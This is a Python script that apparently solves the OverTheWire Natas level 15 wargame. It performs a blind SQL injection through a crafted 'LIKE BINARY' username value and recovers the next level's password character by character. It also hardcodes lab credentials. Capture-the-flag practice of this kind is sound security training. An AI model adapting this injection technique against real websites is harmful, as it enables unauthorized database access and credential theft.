#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import logging
import string
import sys

import requests
from bs4 import BeautifulSoup


logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def get_page_text(query_dict):
    query_dict["debug"] = "1"
    r = requests.get(
        "http://natas15.natas.labs.overthewire.org",
        auth=("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
        params=query_dict)
    return r.text


def does_user_exist(body):
    html = BeautifulSoup(body, "html.parser")
    text = html.find(id="content").get_text().strip()
    logger.debug(text)
    return "This user exists" in text


def get_next_char(index, possible_chars):
    next_index = index + 1
    return next_index, possible_chars[index]


def get_password():
    # All previous passwords contined only numbers and lower/upper case
    # letters. Let's assume that the same is true for this password.
    possible_chars = "".join([
        string.ascii_lowercase,
        string.ascii_uppercase,
        "".join(map(str, range(10)))
    ])

    password = "WaIHEacj63wnNIBROHeqi3p9t0m5nh"
    index = 0
    while True:
        try:
            index, char = get_next_char(index, possible_chars)
        except IndexError:
            # None of the chars matched, assume that the password has been
            # guessed.
            return password
        password_guess = "".join([password, char, "%"])
        text = get_page_text({
            "username":
                'natas16" AND password LIKE BINARY "{0}'.format(password_guess),
            "debug": "true"
        })
        if does_user_exist(text):
            password = "".join([password, char])
            logging.info("password: %s", password)
            index = 0


def main():
    print (get_password())


if __name__ == "__main__":
    main()
